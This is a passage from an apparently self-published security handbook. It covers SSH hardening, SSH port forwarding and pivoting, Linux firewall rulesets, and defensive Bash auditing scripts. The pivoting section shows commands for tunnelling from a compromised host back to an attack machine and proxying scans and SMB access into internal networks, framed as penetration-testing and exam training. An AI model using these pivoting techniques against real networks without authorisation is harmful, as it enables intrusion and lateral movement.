KbdInteractiveAuthentication no
ChallengeResponseAuthentication no
UsePAM yes

# 2. Restrict allowed users/groups and session limits
AllowGroups ssh-admins
MaxAuthTries 3
MaxSessions 4
LoginGraceTime 30
ClientAliveInterval 300
ClientAliveCountMax 2

# 3. Disable unnecessary forwarding unless explicitly required for a jump host
X11Forwarding no
AllowAgentForwarding no
AllowTcpForwarding no
PermitTunnel no

# 4. Modern Cryptographic Algorithm Suite (Mozilla Modern / CIS Benchmark)
KexAlgorithms sntrup761x25519-sha512@openssh.com,curve25519-sha2512,curve25519-sha256,diffie-hellman-group16-sha512,diffie-hellman-group18-sha512
Ciphers chacha20-poly1305@openssh.com,aes256-gcm@openssh.com,aes128-gcm@openssh.com
MACs hmac-sha2-512-etm@openssh.com,hmac-sha2-256-etm@openssh.com
HostKeyAlgorithms ssh-ed25519,rsa-sha2-512,rsa-sha2-256
```

Always validate the syntax of `sshd_config` before restarting `sshd` so you never lock yourself out of a remote server:
```bash
sudo sshd -t && sudo systemctl reload ssh.service
```

### 9.2.3 Complete Guide to SSH Port Forwarding & Pivoting (`-L`, `-R`, `-D`, `-J`)
Understanding the exact direction of connection initiation is critical when pivoting across firewalled network segments during penetration tests or CPTS/OSCP exams.

#### 1. Local Port Forwarding (`ssh -L`)
**Scenario**: You have SSH access to a DMZ Jump/Web Server (`192.168.56.101`). Either `192.168.56.101` is running MySQL (`3306`) bound strictly to `127.0.0.1`, OR `192.168.56.101` can reach an internal database server (`10.20.0.50:5432`) on a private subnet that your workstation cannot reach directly.

```
[Your Workstation]                      [DMZ Server: 192.168.56.101]         [Internal DB: 10.20.0.50]
127.0.0.1:15432  ===(SSH Tunnel :22)===>  Forwards traffic internally  ===>   10.20.0.50:5432
```

```bash
# Syntax: ssh -L [LOCAL_BIND_IP:]LOCAL_PORT:DESTINATION_HOST:DESTINATION_PORT user@SSH_SERVER -N -f
# (-N = Do not execute remote command, just forward ports; -f = Background after authentication)

# Case A: Access a service bound to 127.0.0.1:3306 on the SSH server itself:
ssh -L 127.0.0.1:13306:127.0.0.1:3306 secadmin@192.168.56.101 -N -f
mysql -h 127.0.0.1 -P 13306 -u root -p

# Case B: Pivot through 192.168.56.101 to reach an internal server 10.20.0.50:5432:
ssh -L 127.0.0.1:15432:10.20.0.50:5432 secadmin@192.168.56.101 -N -f
psql -h 127.0.0.1 -p 15432 -U postgres
```

#### 2. Remote (Reverse) Port Forwarding (`ssh -R`)
**Scenario**: You have gained a non-SSH web shell on a compromised internal server (`10.20.0.15`), and inbound firewall rules block all incoming connections from your workstation to `10.20.0.15`. However, `10.20.0.15` **can initiate outbound SSH connections** back to your Attack Workstation (`192.168.56.10`). You run `ssh -R` *from the compromised machine* back to your workstation!

```
[Your Workstation: 192.168.56.10]         [Compromised Host: 10.20.0.15]       [Internal Target: 10.20.0.99]
Listens on 127.0.0.1:8445  <==(Outbound SSH)==  Initiates SSH -R connection  ===>  10.20.0.99:445 (SMB)
```

```bash
# Run ON the compromised target (10.20.0.15) connecting back to your Attack VM (192.168.56.10):
# Syntax: ssh -R [REMOTE_BIND_IP:]REMOTE_PORT:DESTINATION_HOST:DESTINATION_PORT attacker@ATTACK_VM -N -f
ssh -R 127.0.0.1:8445:10.20.0.99:445 kali@192.168.56.10 -N

# Now, on your Attack VM (192.168.56.10), connecting to 127.0.0.1:8445 tunnels directly to 10.20.0.99:445!
smbclient -L //127.0.0.1/ -p 8445 -U "corp/admin"
```

#### 3. Dynamic Application-Level SOCKS Proxy (`ssh -D`) + `proxychains4`
**Scenario**: Instead of forwarding a single TCP port at a time, you want to route **any arbitrary TCP tool** (`nmap -sT`, `curl`, `impacket-psexec`, `BloodHound`, or Firefox/Burp Suite) through the SSH server into the internal `10.20.0.0/24` network!

```bash
# 1. Start a local SOCKS5 proxy listening on 127.0.0.1:1080 that routes all traffic through 192.168.56.101
ssh -D 127.0.0.1:1080 secadmin@192.168.56.101 -N -f

# 2. Ensure /etc/proxychains4.conf has 'socks5 127.0.0.1 1080' at the bottom (and 'proxy_dns' enabled)
tail -n 2 /etc/proxychains4.conf
# socks5 127.0.0.1 1080

# 3. Prefix any command with 'proxychains -q' (-q = quiet mode) to tunnel it through the SOCKS5 proxy!
# Note: With nmap over SOCKS proxies, always use TCP Connect Scan (-sT) and disable ICMP ping (-Pn)
proxychains -q nmap -sT -Pn -p 22,80,443,445,3389,8080 10.20.0.10-30
proxychains -q curl -ik https://10.20.0.25:8443/
```

#### 4. Multi-Hop Bastion Chaining with `ProxyJump` (`ssh -J`) and `~/.ssh/config`
```bash
# Connect to an internal server (10.20.0.50) by jumping seamlessly through a DMZ Bastion (203.0.113.5)
ssh -J bastion_user@203.0.113.5 internal_admin@10.20.0.50
```

You can codify all jump hosts, keys, and port forwards cleanly inside `~/.ssh/config`:
```sshconfig
# ~/.ssh/config
Host dmz-bastion
    HostName 203.0.113.5
    User bastion_user
    Port 22
    IdentityFile ~/.ssh/id_ed25519_prod
    IdentitiesOnly yes

Host prod-db-internal
    HostName 10.20.0.50
    User internal_admin
    IdentityFile ~/.ssh/id_ed25519_internal
    IdentitiesOnly yes
    ProxyJump dmz-bastion
    LocalForward 127.0.0.1:15432 127.0.0.1:5432
```
With this `~/.ssh/config`, typing `ssh prod-db-internal` automatically authenticates to the bastion, hops to `10.20.0.50`, and binds local port `15432` in a single command!

---

## 9.3 Linux Host Firewalls: Netfilter, `iptables`, `nftables`, and `ufw`

Inside the Linux kernel, packet filtering, Network Address Translation (NAT), and connection tracking (`conntrack`) are implemented by the **Netfilter** framework.

```
                     [ Incoming Network Packet ]
                                  |
                                  v
                       +--------------------+
                       |    PREROUTING      | (DNAT / Port Forwarding)
                       +---------+----------+
                                 |
                    +------------+------------+
                    | Routing Decision:       |
                    | Is IP for this host?    |
                    +----+---------------+----+
           Yes (Local)   |               |   No (Routed to another host)
                         v               v
                  +-------------+  +-------------+
                  |    INPUT    |  |   FORWARD   |
                  +------+------+  +------+------+
                         |                |
                         v                |
               [Local Process/Socket]     |
                         |                |
                         v                |
                  +-------------+         |
                  |   OUTPUT    |         |
                  +------+------+         |
                         |                |
                         +-------+--------+
                                 |
                                 v
                       +--------------------+
                       |    POSTROUTING     | (SNAT / Masquerading)
                       +---------+----------+
                                 |
                                 v
                     [ Outgoing Network Packet ]
```

### 9.3.1 Designing a Stateful Host Firewall Ruleset with `iptables`
A stateful firewall inspects the connection tracking state (`-m conntrack --ctstate`) so that return packets for outbound connections initiated by the server are permitted (`ESTABLISHED,RELATED`), while unsolicited inbound packets are dropped (`DROP`):

```bash
#!/usr/bin/env bash
# Production Stateful iptables Host Firewall Baseline
set -euo pipefail

# 1. Flush existing rules in filter table
sudo iptables -F
sudo iptables -X

# 2. Set default policies FIRST (Set INPUT and FORWARD to DROP after allowing loopback/established to avoid SSH lockout)
sudo iptables -A INPUT -i lo -j ACCEPT
sudo iptables -A OUTPUT -o lo -j ACCEPT

# 3. Allow established and related packets (preserves active SSH sessions!)
sudo iptables -A INPUT -m conntrack --ctstate ESTABLISHED,RELATED -j ACCEPT

# 4. Drop invalid packets (malformed TCP flag combinations or out-of-state packets)
sudo iptables -A INPUT -m conntrack --ctstate INVALID -j DROP

# 5. Allow rate-limited ICMP echo-requests (ping) for network diagnostics
sudo iptables -A INPUT -p icmp --icmp-type echo-request -m limit --limit 5/sec --limit-burst 10 -j ACCEPT

# 6. Allow inbound SSH (Port 22) with brute-force rate limiting (Drop if > 4 new connections in 60 seconds per source IP)
sudo iptables -A INPUT -p tcp --dport 22 -m conntrack --ctstate NEW -m recent --set --name SSH_BRUTE
sudo iptables -A INPUT -p tcp --dport 22 -m conntrack --ctstate NEW -m recent --update --seconds 60 --hitcount 5 --name SSH_BRUTE -j DROP
sudo iptables -A INPUT -p tcp --dport 22 -m conntrack --ctstate NEW -j ACCEPT

# 7. Allow inbound HTTP (80) and HTTPS (443) for web servers
sudo iptables -A INPUT -p tcp -m multiport --dports 80,443 -m conntrack --ctstate NEW -j ACCEPT

# 8. Log dropped inbound packets (rate-limited to prevent log flooding) and set default DROP policy
sudo iptables -A INPUT -m limit --limit 3/min -j LOG --log-prefix "[IPTABLES-DROP-IN] " --log-level 4
sudo iptables -P INPUT DROP
sudo iptables -P FORWARD DROP
sudo iptables -P OUTPUT ACCEPT

# 9. View active rules with packet/byte counters (-v) and line numbers (--line-numbers)
sudo iptables -L -v -n --line-numbers
```

### 9.3.2 Modern Declarative Firewalling with `nftables` (`/etc/nftables.conf`)
`nftables` replaces legacy `iptables`, `ip6tables`, `arptables`, and `ebtables` with a single unified kernel virtual machine and clean atomic configuration syntax (`inet` family covers both IPv4 and IPv6 simultaneously!):

```nft
#!/usr/sbin/nft -f
# /etc/nftables.conf - Unified IPv4/IPv6 Stateful Host Firewall

flush ruleset

table inet filter {
    chain input {
        type filter hook input priority 0; policy drop;

        # 1. Accept all loopback traffic
        iifname "lo" accept

        # 2. Accept established/related traffic and drop invalid packets
        ct state established,related accept
        ct state invalid drop

        # 3. Accept ICMP and ICMPv6 neighbor discovery / ping (rate-limited)
        ip protocol icmp icmp type echo-request limit rate 5/second accept
        ip6 nexthdr icmpv6 icmpv6 type { nd-neighbor-solicit, nd-router-advert, nd-neighbor-advert, echo-request } accept

        # 4. Accept SSH (port 22) with per-IP rate limiting (max 4 new conns/minute)
        tcp dport 22 ct state new meter ssh_limit { ip saddr limit rate 4/minute burst 4 packets } accept

        # 5. Accept HTTPS (443) and HTTP (80)
        tcp dport { 80, 443 } ct state new accept

        # 6. Log and count remaining dropped packets
        limit rate 3/minute log prefix "[NFT-DROP-IN] " counter drop
    }

    chain forward {
        type filter hook forward priority 0; policy drop;
    }

    chain output {
        type filter hook output priority 0; policy accept;
    }
}
```
Apply and enable the `nftables` ruleset:
```bash
sudo nft -f /etc/nftables.conf
sudo systemctl enable --now nftables.service
sudo nft list ruleset
```

### 9.3.3 Rapid Host Administration with `ufw` (Uncomplicated Firewall)
On Ubuntu and Debian servers, `ufw` provides a clean administrative CLI frontend:
```bash
sudo ufw default deny incoming
sudo ufw default allow outgoing
sudo ufw limit 22/tcp comment "Rate-limited SSH access"
sudo ufw allow 443/tcp comment "HTTPS Web Traffic"
sudo ufw allow from 203.0.113.45/32 to any port 5432 proto tcp comment "Allow Postgres from Bastion only"
sudo ufw enable
sudo ufw status numbered
```

---

## 9.4 Chapter 9 Hands-On Lab Exercises & Review Questions

### Lab 9.1: Local Port Forwarding & Internal Service Discovery Practice
1. Start a lightweight Python HTTP server on your Linux workstation bound **strictly to loopback (`127.0.0.1`)** on port `9999`:
   ```bash
   python3 -m http.server 9999 --bind 127.0.0.1 &
   HTTP_PID=$!
   ```
2. Verify with `ss -tulnp | grep 9999` that port `9999` is listening only on `127.0.0.1:9999`.
3. Use `ssh -L` to forward local port `8888` to `127.0.0.1:9999` over your local SSH daemon (or between your Attack VM and Target VM), verify access with `curl -i http://127.0.0.1:8888`, and terminate `$HTTP_PID`.

### Chapter 9 Review Questions
1. Why will an external `nmap` scan against a server's public IP address (`203.0.113.10`) fail to detect a Redis instance listening on `127.0.0.1:6379`, and how can an attacker who gains a low-privilege SSH session on that server interact with the Redis port from their local workstation?
2. Contrast **Local Port Forwarding (`ssh -L`)**, **Remote Port Forwarding (`ssh -R`)**, and **Dynamic SOCKS Proxying (`ssh -D`)** in terms of where the listening socket is opened and how many destination ports can be reached.
3. Why must you use `-sT` (TCP Connect Scan) and `-Pn` when running `nmap` through `proxychains4` over an `ssh -D` SOCKS5 proxy instead of the default `-sS` (SYN Stealth Scan)?
4. In `iptables` and `nftables`, why is the `ct state established,related accept` rule placed near the very top of the `INPUT` chain before the default `DROP` policy?

---

# Chapter 10: Bash Scripting for Security Auditing & Automation

## 10.1 Defensive Bash Engineering: Strict Mode, Variables, Arrays, Control Structures, `getopts`, and `trap`

Most tutorial shell scripts are fragile, insecure, and prone to catastrophic failures when filenames contain spaces, commands fail silently, or variables are uninitialized. When writing security automation or incident response scripts that run as `root`, you must adhere to **defensive Bash engineering standards**.

### 10.1.1 The Unofficial Bash Strict Mode (`set -euo pipefail`)
Start every production Bash script with the following header:

```bash
#!/usr/bin/env bash
set -Eeuo pipefail
IFS=$'\n\t'
umask 0027
```

- **`set -e` (`errexit`)**: Immediately abort script execution if any command exits with a non-zero status code (unless part of an `if`, `while`, `||`, or `&&` test). Prevents cascading disasters (such as `cd /nonexistent_dir` failing and `rm -rf *` deleting the current directory!).
- **`set -E` (`errtrace`)**: Ensures that `ERR` traps are inherited by shell functions, command substitutions, and subshells.
- **`set -u` (`nounset`)**: Treat unset/uninitialized variables as an immediate fatal error instead of silently expanding them to an empty string `""` (prevents `rm -rf "$UNSET_PATH/"` from turning into `rm -rf "/"`!).
- **`set -o pipefail`**: By default, a pipeline `cmd1 | cmd2 | cmd3` returns the exit code of the *last* command (`cmd3`), hiding failures in `cmd1`. `pipefail` sets the pipeline's return code to the rightmost non-zero exit code.
- **`IFS=$'\n\t'`**: Removes the space character from the Internal Field Separator so unquoted expansions do not split on spaces in filenames.

### 10.1.2 Variables, Parameter Expansion, Indexed Arrays & Associative Arrays
Always double-quote variable expansions (`"$target_file"`) to prevent word splitting and glob expansion:

```bash
#!/usr/bin/env bash
set -Eeuo pipefail

# 1. Safe Parameter Expansion Idioms
readonly DEFAULT_TIMEOUT="${SCAN_TIMEOUT:-5}"          # Use default '5' if SCAN_TIMEOUT is unset or empty
readonly LOG_FILE="/var/log/sec/audit_2026-11-02.log"
echo "Directory: ${LOG_FILE%/*}"                       # Strip shortest suffix matching /* -> /var/log/sec
echo "Filename:  ${LOG_FILE##*/}"                      # Strip longest prefix matching */  -> audit_2026-11-02.log

# 2. Indexed Arrays (Zero-indexed list of elements)
declare -a CRITICAL_FILES=(
    "/etc/passwd"
    "/etc/shadow"
    "/etc/sudoers"
    "/etc/ssh/sshd_config"
)

# Iterate safely over an indexed array preserving spaces in elements:
for filepath in "${CRITICAL_FILES[@]}"; do
    if [[ -f "$filepath" ]]; then
        printf "[OK] Found critical file: %s\n" "$filepath"
    fi
done

# 3. Associative Arrays (Key-Value Hash Maps - requires Bash 4.0+ 'declare -A')
declare -A EXPECTED_PERMS=(
    ["/etc/passwd"]="644"
    ["/etc/shadow"]="640"
    ["/etc/sudoers"]="440"
    ["/etc/ssh/sshd_config"]="600"
)

for file in "${!EXPECTED_PERMS[@]}"; do
    printf "Target: %-22s | Expected Octal Mode: %s\n" "$file" "${EXPECTED_PERMS[$file]}"
done
```

### 10.1.3 Conditionals (`[[ ... ]]` vs. `[ ... ]`), Exit Codes (`$?`), and Functions
Always prefer Bash's `[[ ... ]]` compound command over legacy POSIX `[ ... ]` (`test`): `[[ ... ]]` prevents word splitting, supports regex matching (`=~`), and allows `&&` / `||` logical operators inside the brackets:

```bash
# File & String Test Operators inside [[ ... ]]:
# -e (exists), -f (regular file), -d (directory), -L (symlink), -r (readable), -w (writable), -x (executable), -s (size > 0)
# -z "$str" (string is empty), -n "$str" (string is non-empty)
# "$a" == "$b" (string equality), "$str" =~ ^[0-9]+$ (Extended Regular Expression match - DO NOT quote the regex on the right!)
# -eq, -ne, -lt, -le, -gt, -ge (Integer arithmetic comparisons)

validate_ipv4() {
    local ip="${1:-}"
    local ipv4_regex='^([0-9]{1,3}\.){3}[0-9]{1,3}$'
    if [[ ! "$ip" =~ $ipv4_regex ]]; then
        return 1
    fi
    # Verify each octet is <= 255
    local IFS='.'
    read -r -a octets <<< "$ip"
    for octet in "${octets[@]}"; do
        if (( octet < 0 || octet > 255 )); then
            return 1
        fi
    done
    return 0
}
```

### 10.1.4 Safe Line-by-Line File Reading, `getopts`, and Signal Trapping (`trap`)
Never read lines of a file with `for line in $(cat file)` (which splits on whitespace and expands globs `*`). Always use `while IFS= read -r line`:

```bash
# Safe line-by-line file processing idiom:
while IFS= read -r line || [[ -n "$line" ]]; do
    # Skip empty lines and comment lines starting with #
    [[ -z "$line" || "$line" =~ ^[[:space:]]*# ]] && continue
    printf "Processing target: %s\n" "$line"
done < "targets.txt"
```

#### Atomic Cleanup & Error Handling with `trap`
When a script creates temporary files containing sensitive credentials or hashes, use `trap` to guarantee cleanup even if the user presses `Ctrl+C` (`SIGINT`), the process is killed (`SIGTERM`), or a command fails (`EXIT`):

```bash
TMP_WORK_DIR="$(mktemp -d -t sec_audit.XXXXXXXXXX)"
cleanup() {
    local exit_code=$?
    rm -rf -- "$TMP_WORK_DIR"
    exit "$exit_code"
}
trap cleanup EXIT INT TERM HUP
```

---

## 10.2 Six Production-Grade Defensive & Auditing Bash Scripts

Every script below is complete, self-contained, POSIX/Bash strict-mode compliant, and engineered for real-world security auditing, blue-team monitoring, and compliance verification.

---

### Script 1: Network Subnet Reachability & Service Health Auditor (`subnet_service_auditor.sh`)

#### Purpose & Engineering Architecture
Audits a list of authorized enterprise hosts (or a `/24` lab subnet) for ICMP reachability and critical TCP service health (e.g., SSH `22`, HTTP `80`, HTTPS `443`, SIEM Agent `1514`) using native Linux tools (`ping` and `timeout` + `/dev/tcp` or `nc`), outputting both colorized terminal status and a structured CSV/JSON audit log without requiring external third-party dependencies.

```bash
#!/usr/bin/env bash
# ==============================================================================
# Script Name: subnet_service_auditor.sh
# Description: Authorized Enterprise Subnet & TCP Service Health Auditor
# Author:      Sri Lankan Elite Hacker's Bible - Reference Engineering Suite
# Usage:       ./subnet_service_auditor.sh -t targets.txt -p "22,80,443" -o report.csv
# ==============================================================================
set -Eeuo pipefail
IFS=$'\n\t'
umask 0027

# --- Configuration Defaults ---
TARGETS_FILE=""
PORTS_CSV="22,80,443"
OUTPUT_CSV="service_health_audit_$(date +%Y%m%d_%H%M%S).csv"
TIMEOUT_SEC=2

# --- Color Definitions ---
readonly C_RED='\033[0;31m'
readonly C_GREEN='\033[0;32m'
readonly C_YELLOW='\033[1;33m'
readonly C_BLUE='\033[0;34m'
readonly C_RESET='\033[0m'

usage() {
    cat <<EOF
Usage: $(basename "$0") -t <targets_file> [-p <ports_csv>] [-w <timeout_sec>] [-o <output_csv>]

Options:
  -t  Path to file containing authorized hostnames or IPv4 addresses (one per line)
  -p  Comma-separated TCP ports to audit (default: 22,80,443)
  -w  Connection timeout in seconds per check (default: 2)
  -o  Output CSV report path (default: service_health_audit_<timestamp>.csv)
  -h  Display this help message
EOF
    exit 1
}

# --- Parse CLI Arguments via getopts ---
while getopts ":t:p:w:o:h" opt; do
    case "$opt" in
        t) TARGETS_FILE="$OPTARG" ;;
        p) PORTS_CSV="$OPTARG" ;;
        w) TIMEOUT_SEC="$OPTARG" ;;
        o) OUTPUT_CSV="$OPTARG" ;;
        h) usage ;;
        \?) printf "${C_RED}[ERROR] Invalid option: -%s${C_RESET}\n" "$OPTARG" >&2; usage ;;
        :)  printf "${C_RED}[ERROR] Option -%s requires an argument.${C_RESET}\n" "$OPTARG" >&2; usage ;;
    esac
done

if [[ -z "$TARGETS_FILE" || ! -r "$TARGETS_FILE" ]]; then
    printf "${C_RED}[FATAL] Targets file (-t) is required and must be readable.${C_RESET}\n" >&2
    usage
fi

# Convert comma-separated ports into an indexed array
IFS=',' read -r -a PORT_LIST <<< "$PORTS_CSV"

# Initialize CSV Header
printf "timestamp_utc,target_host,icmp_status,tcp_port,service_state,latency_ms\n" > "$OUTPUT_CSV"

check_icmp() {
    local host="$1"
    if ping -c 1 -W "$TIMEOUT_SEC" "$host" >/dev/null 2>&1; then
        return 0
    else
        return 1
    fi
}

check_tcp_port() {
    local host="$1"
    local port="$2"
    # Use timeout with bash native /dev/tcp socket probe
    if timeout "$TIMEOUT_SEC" bash -c "exec 3<>/dev/tcp/${host}/${port}" 2>/dev/null; then
        return 0
    else
        return 1
    fi
}

printf "${C_BLUE}[*] Starting Authorized Subnet & Service Health Audit at %s${C_RESET}\n" "$(date -u +"%Y-%m-%dT%H:%M:%SZ")"
printf "${C_BLUE}[*] Auditing Ports: %s | Timeout: %ss | Output: %s${C_RESET}\n\n" "$PORTS_CSV" "$TIMEOUT_SEC" "$OUTPUT_CSV"

total_hosts=0
reachable_hosts=0
open_services=0

while IFS= read -r host || [[ -n "$host" ]]; do
    # Strip leading/trailing whitespace and skip comments/empty lines
    host="$(echo "$host" | sed -E 's/^[[:space:]]+|[[:space:]]+$//g')"
    [[ -z "$host" || "$host" =~ ^# ]] && continue

    total_hosts=$((total_hosts + 1))
    now_utc="$(date -u +"%Y-%m-%dT%H:%M:%SZ")"

    if check_icmp "$host"; then
        icmp_state="REACHABLE"
        reachable_hosts=$((reachable_hosts + 1))
        printf "${C_GREEN}[+] Host %-25s [ICMP: UP]${C_RESET}\n" "$host"
    else
        icmp_state="ICMP_FILTERED_OR_DOWN"
        printf "${C_YELLOW}[!] Host %-25s [ICMP: NO_REPLY - Probing TCP ports anyway]${C_RESET}\n" "$host"
    fi

    for port in "${PORT_LIST[@]}"; do
        [[ ! "$port" =~ ^[0-9]+$ ]] && continue
        start_ns="$(date +%s%N)"
        if check_tcp_port "$host" "$port"; then
            end_ns="$(date +%s%N)"
            latency_ms=$(( (end_ns - start_ns) / 1000000 ))
            svc_state="OPEN"
            open_services=$((open_services + 1))
            printf "    |-- TCP/%-6s : ${C_GREEN}%-8s${C_RESET} (%d ms)\n" "$port" "$svc_state" "$latency_ms"
        else
            latency_ms=-1
            svc_state="CLOSED_OR_FILTERED"
            printf "    |-- TCP/%-6s : ${C_RED}%-8s${C_RESET}\n" "$port" "$svc_state"
        fi
        printf "%s,%s,%s,%s,%s,%d\n" "$now_utc" "$host" "$icmp_state" "$port" "$svc_state" "$latency_ms" >> "$OUTPUT_CSV"
    done
done < "$TARGETS_FILE"

printf "\n${C_BLUE}[*] Audit Complete: %d Hosts Scanned | %d ICMP Reachable | %d Open TCP Services${C_RESET}\n" \
    "$total_hosts" "$reachable_hosts" "$open_services"
printf "${C_BLUE}[*] CSV Report saved to: %s${C_RESET}\n" "$OUTPUT_CSV"
```

#### Line-by-Line Engineering Explanation
1. **Lines 8–10 (`set -Eeuo pipefail`, `IFS`, `umask 0027`)**: Enforces strict error handling, safe field splitting, and restrictive permissions (`0640`) on the generated CSV report.
2. **Lines 35–46 (`getopts ":t:p:w:o:h"`)**: Parses command-line flags cleanly without brittle positional parameters (`$1`, `$2`). The leading colon `:` enables silent error reporting so custom error handlers catch unknown flags (`\?`) or missing arguments (`:`).
3. **Line 71 (`timeout "$TIMEOUT_SEC" bash -c "exec 3<>/dev/tcp/${host}/${port}"`)**: Uses Bash's built-in `/dev/tcp/<host>/<port>` virtual device wrapped inside GNU `timeout` to test TCP 3-way handshakes without needing `nmap` or `nc` installed on minimal production servers.
4. **Lines 101–103 (`date +%s%N`)**: Captures nanosecond timestamps before and after the TCP handshake to compute exact millisecond connection latency (`(end_ns - start_ns) / 1000000`).

---

### Script 2: Automated DNS & TLS Certificate Expiry Monitor (`dns_tls_expiry_monitor.sh`)

#### Purpose & Engineering Architecture
Expired TLS certificates cause catastrophic production outages, while unexpected DNS A-record changes or weak TLS protocol versions (`TLSv1.0`/`TLSv1.1`) indicate DNS hijacking or cryptographic degradation. This script audits a list of domains using `dig` and `openssl s_client`, computes exact days remaining until certificate expiration, verifies issuer chains, and returns a non-zero exit code for alerting pipelines if any certificate expires within the warning threshold (e.g., `< 14 days`).

```bash
#!/usr/bin/env bash
# ==============================================================================
# Script Name: dns_tls_expiry_monitor.sh
# Description: Automated DNS Resolution & X.509 TLS Certificate Expiry Auditor
# Usage:       ./dns_tls_expiry_monitor.sh -d domains.txt -w 30 -c 7
# ==============================================================================
set -Eeuo pipefail
IFS=$'\n\t'
umask 0027

DOMAINS_FILE=""
WARN_DAYS=30
CRIT_DAYS=7
PORT=443
CONN_TIMEOUT=5

readonly C_RED='\033[0;31m'
readonly C_GREEN='\033[0;32m'
readonly C_YELLOW='\033[1;33m'
readonly C_CYAN='\033[0;36m'
readonly C_RESET='\033[0m'

usage() {
    cat <<EOF
Usage: $(basename "$0") -d <domains_file> [-w <warn_days>] [-c <crit_days>] [-p <port>]

Options:
  -d  File containing FQDNs to monitor (one domain per line)
  -w  Warning threshold in days before TLS expiry (default: 30)
  -c  Critical threshold in days before TLS expiry (default: 7)
  -p  Target TLS port (default: 443)
  -h  Show this help message
EOF
    exit 1
}

while getopts ":d:w:c:p:h" opt; do
    case "$opt" in
        d) DOMAINS_FILE="$OPTARG" ;;
        w) WARN_DAYS="$OPTARG" ;;
        c) CRIT_DAYS="$OPTARG" ;;
        p) PORT="$OPTARG" ;;
        h) usage ;;
        *) usage ;;
    esac
done

if [[ -z "$DOMAINS_FILE" || ! -r "$DOMAINS_FILE" ]]; then
    printf "${C_RED}[FATAL] Domains file (-d) is required and must be readable.${C_RESET}\n" >&2
    usage
fi

printf "%-28s | %-15s | %-10s | %-8s | %s\n" "DOMAIN" "RESOLVED_IPV4" "STATUS" "DAYS_REM" "EXPIRY_DATE_UTC (ISSUER)"
printf "%s\n" "------------------------------------------------------------------------------------------------------------"

alert_count=0

while IFS= read -r domain || [[ -n "$domain" ]]; do
    domain="$(echo "$domain" | tr -d '[:space:]')"
    [[ -z "$domain" || "$domain" =~ ^# ]] && continue

    # 1. Resolve IPv4 A record using dig
    resolved_ip="$(dig +time=2 +tries=1 +short "$domain" A | grep -E '^[0-9]+\.' | head -n 1 || true)"
    if [[ -z "$resolved_ip" ]]; then
        printf "%-28s | %-15s | ${C_RED}%-10s${C_RESET} | %-8s | %s\n" \
            "$domain" "NXDOMAIN/FAIL" "DNS_FAIL" "N/A" "Failed to resolve A record"
        alert_count=$((alert_count + 1))
        continue
    fi

    # 2. Fetch X.509 Certificate via openssl s_client with SNI (-servername)
    cert_pem="$(timeout "$CONN_TIMEOUT" openssl s_client -connect "${domain}:${PORT}" -servername "$domain" </dev/null 2>/dev/null \
        | sed -ne '/-BEGIN CERTIFICATE-/,/-END CERTIFICATE-/p' || true)"

    if [[ -z "$cert_pem" ]]; then
        printf "%-28s | %-15s | ${C_RED}%-10s${C_RESET} | %-8s | %s\n" \
            "$domain" "$resolved_ip" "TLS_FAIL" "N/A" "TLS Handshake failed on port ${PORT}"
        alert_count=$((alert_count + 1))
        continue
    fi

    # 3. Extract enddate, subject, and issuer from the leaf certificate
    end_date_str="$(echo "$cert_pem" | openssl x509 -noout -enddate | cut -d= -f2)"
    issuer_cn="$(echo "$cert_pem" | openssl x509 -noout -issuer -nameopt RFC2253 | sed -E 's/.*CN=([^,]+).*/\1/')"

    # Convert certificate expiry date and current time to Unix Epoch seconds
    expiry_epoch="$(date -d "$end_date_str" +%s)"
    now_epoch="$(date +%s)"
    days_remaining=$(( (expiry_epoch - now_epoch) / 86400 ))

    if (( days_remaining <= CRIT_DAYS )); then
        status_label="CRITICAL"
        color="$C_RED"
        alert_count=$((alert_count + 1))
    elif (( days_remaining <= WARN_DAYS )); then
        status_label="WARNING"
        color="$C_YELLOW"
        alert_count=$((alert_count + 1))
    else
        status_label="HEALTHY"
        color="$C_GREEN"
    fi

    printf "%-28s | %-15s | ${color}%-10s${C_RESET} | %-8d | %s (%s)\n" \
        "$domain" "$resolved_ip" "$status_label" "$days_remaining" "$end_date_str" "$issuer_cn"

done < "$DOMAINS_FILE"

if (( alert_count > 0 )); then
    printf "\n${C_RED}[!] Audit finished with %d warning/critical domain alerts.${C_RESET}\n" "$alert_count"
    exit 2
fi
printf "\n${C_GREEN}[+] All monitored domains and TLS certificates are healthy.${C_RESET}\n"
exit 0
```

#### Line-by-Line Engineering Explanation
1. **Line 62 (`dig +time=2 +tries=1 +short "$domain" A | grep -E '^[0-9]+\.'`)**: Queries DNS with a strict 2-second timeout and filters out CNAME lines so only the final IPv4 address is captured.
2. **Line 71 (`openssl s_client -connect ... -servername "$domain" </dev/null`)**: Passes the `-servername` flag to enforce **TLS Server Name Indication (SNI)**—essential when auditing modern cloud/CDN hosts (Cloudflare, AWS ALB, Nginx VHosts) that host multiple TLS certificates on a single IP address—and closes `stdin` immediately (`</dev/null`).
3. **Lines 85–87 (`date -d "$end_date_str" +%s`)**: Parses the ASN.1 timestamp from OpenSSL into Unix Epoch seconds, subtracts the current Epoch timestamp, and divides by `86400` seconds/day to calculate exact days until expiration.

---

### Script 3: Authentication Log (`auth.log`) Brute-Force & Anomaly Analyzer (`auth_log_analyzer.sh`)

#### Purpose & Engineering Architecture
Parses Debian/Ubuntu `/var/log/auth.log` (or RHEL `/var/log/secure`) to detect:
1. **SSH Brute-Force / Credential Stuffing Sources** exceeding a configurable failure threshold.
2. **Invalid / Non-Existent Username Enumeration** attempts.
3. **Successful Logins Following Brute-Force Activity** (compromise detection!).
4. **Privilege Escalation Events**: `sudo` failures, `su` invocations, and newly created user accounts (`useradd`) or group modifications (`usermod`).

```bash
#!/usr/bin/env bash
# ==============================================================================
# Script Name: auth_log_analyzer.sh
# Description: Linux Authentication Log (auth.log) Brute-Force & Intrusion Hunter
# Usage:       sudo ./auth_log_analyzer.sh -f /var/log/auth.log -b 5
# ==============================================================================
set -Eeuo pipefail
IFS=$'\n\t'
umask 0027

AUTH_LOG="/var/log/auth.log"
BRUTE_THRESHOLD=5

readonly C_RED='\033[0;31m'
readonly C_GREEN='\033[0;32m'
readonly C_YELLOW='\033[1;33m'
readonly C_BLUE='\033[0;34m'
readonly C_RESET='\033[0m'

while getopts ":f:b:h" opt; do
    case "$opt" in
        f) AUTH_LOG="$OPTARG" ;;
        b) BRUTE_THRESHOLD="$OPTARG" ;;
        *) echo "Usage: $0 [-f /var/log/auth.log] [-b brute_threshold]"; exit 1 ;;
    esac
done

if [[ ! -r "$AUTH_LOG" ]]; then
    printf "${C_RED}[FATAL] Cannot read log file: %s (Run with sudo or check path)${C_RESET}\n" "$AUTH_LOG" >&2
    exit 1
fi

printf "${C_BLUE}=========================================================================${C_RESET}\n"
